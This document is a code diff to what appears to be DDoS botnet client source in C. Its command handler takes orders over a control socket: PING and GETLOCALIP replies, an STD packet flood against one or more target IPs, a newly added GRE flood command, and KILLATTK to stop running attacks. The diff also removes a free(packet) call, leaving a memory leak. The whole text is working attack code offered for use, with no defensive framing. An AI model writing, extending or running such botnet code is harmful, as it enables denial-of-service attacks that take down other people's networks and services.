@@ -807,7 +807,7 @@ void send_packets(unsigned char *ip, int port,  int secs, int packetsize) {
     }
 
     close(sock);
-    free(packet);
+  
 }
 
 
@@ -816,68 +816,88 @@ void send_packets(unsigned char *ip, int port,  int secs, int packetsize) {
 
 void processCmd(int argc, unsigned char *argv[])
 {
-	int x;
-        if(!strcmp(argv[0], "PING"))
-        {
-                sockprintf(mainCommSock, "PONG!");
-                return;
-        }
+    int x;
 
-        if(!strcmp(argv[0], "GETLOCALIP"))
-        {
-                sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
-                return;
-        }
-
-        if (!strcmp(argv[0], "STD")) {
-    if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) {
+    if (!strcmp(argv[0], "PING")) {
+        sockprintf(mainCommSock, "PONG!");
         return;
     }
 
-    unsigned char *ip = argv[1];          // now this is correct
-    int port = atoi(argv[2]);
-    int time = atoi(argv[3]);
-    int packetsize = atoi(argv[4]);
-
-    if (strstr((char *)ip, ",") != NULL) {
-        unsigned char *hi = strtok((char *)ip, ",");
-        while (hi != NULL) {
-            if (!listFork()) {
-                send_packets((unsigned char *)hi, port, time, packetsize);  // fixed arg order
-                _exit(0);
-            }
-            hi = strtok(NULL, ",");
-        }
-    } else {
-        if (listFork()) return;
-        send_packets(ip, port, time, packetsize);  // fixed arg order
-        _exit(0);
+    if (!strcmp(argv[0], "GETLOCALIP")) {
+        sockprintf(mainCommSock, "My IP: %s", inet_ntoa(ourIP));
+        return;
     }
-}
 
-      
-     
-	if(!strcmp(argv[0], "KILLATTK"))
-        {
-                int killed = 0;
-                unsigned long i;
-                for (i = 0; i < numpids; i++) {
-                        if (pids[i] != 0 && pids[i] != getpid()) {
-                                kill(pids[i], 9);
-                                killed++;
-                        }
-                }
-
-                if(killed > 0)
-                {
-                } else {
-                }
+    if (!strcmp(argv[0], "STD")) {
+        if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) {
+            return;
         }
 
-        if(!strcmp(argv[0], "LOLNOGTFO"))
-        {
-                exit(0);
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        int packetsize = atoi(argv[4]);
+
+        if (strstr((char *)ip, ",") != NULL) {
+            unsigned char *hi = strtok((char *)ip, ",");
+            while (hi != NULL) {
+                if (!listFork()) {
+                    send_packets((unsigned char *)hi, port, time, packetsize);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) return;
+            send_packets(ip, port, time, packetsize);
+            _exit(0);
         }
+    }
+
+    // ----------------------- GRE Command Support -----------------------
+    if (!strcmp(argv[0], "GRE")) {
+        if (argc < 5 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1 || atoi(argv[4]) < 1) {
+            return;
+        }
+
+        unsigned char *ip = argv[1];
+        int port = atoi(argv[2]);
+        int time = atoi(argv[3]);
+        int packetsize = atoi(argv[4]);
+
+        if (strstr((char *)ip, ",") != NULL) {
+            unsigned char *hi = strtok((char *)ip, ",");
+            while (hi != NULL) {
+                if (!listFork()) {
+                    send_gre_udp_packets((char *)hi, port, packetsize, time);
+                    _exit(0);
+                }
+                hi = strtok(NULL, ",");
+            }
+        } else {
+            if (listFork()) return;
+            send_gre_udp_packets((char *)ip, port, packetsize, time);
+            _exit(0);
+        }
+    }
+    // -------------------------------------------------------------------
+
+    if (!strcmp(argv[0], "KILLATTK")) {
+        int killed = 0;
+        unsigned long i;
+        for (i = 0; i < numpids; i++) {
+            if (pids[i] != 0 && pids[i] != getpid()) {
+                kill(pids[i], 9);
+                killed++;
+            }
+        }
+
+        if (killed > 0) {
+            // optionally log
+        } else {
+            // optionally log
+        }
+    }
 }
 
 int initConnection()
